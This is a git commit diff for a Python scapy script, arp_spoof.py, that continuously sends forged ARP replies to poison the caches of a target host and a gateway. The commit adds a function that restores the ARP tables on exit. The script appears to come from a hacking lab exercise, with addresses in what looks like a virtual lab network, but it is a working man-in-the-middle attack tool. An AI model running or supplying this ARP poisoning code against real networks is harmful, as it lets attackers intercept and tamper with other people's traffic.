e1d4c1de78283d04c3e7ca3733d899e4a306e246
Stefan <untilastefan8@gmail.com>
2025-05-06 06:43:54 -0400

    added restore function

--- arp_spoof/arp_spoof.py
+++ arp_spoof/arp_spoof.py
@@ -16,13 +16,24 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.sendp(packet, verbose=False)
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.sendp(packet, count=4, verbose=False)
+
+target_ip = "10.0.2.15"
+gateway_ip = "10.0.2.1"
+
 sent_packets_count = 0
 try:
     while True:
-        spoof("10.0.2.15", "10.0.2.1")
-        spoof("10.0.2.1", "10.0.2.15")
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         sent_packets_count += 2
         print("\r[+] Packets sent: " + str(sent_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("[+] Detected CTRL + C ..... Quitting.")
+    print("\n[-] Detected CTRL + C ..... Resetting ARP tables ..... Please wait\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
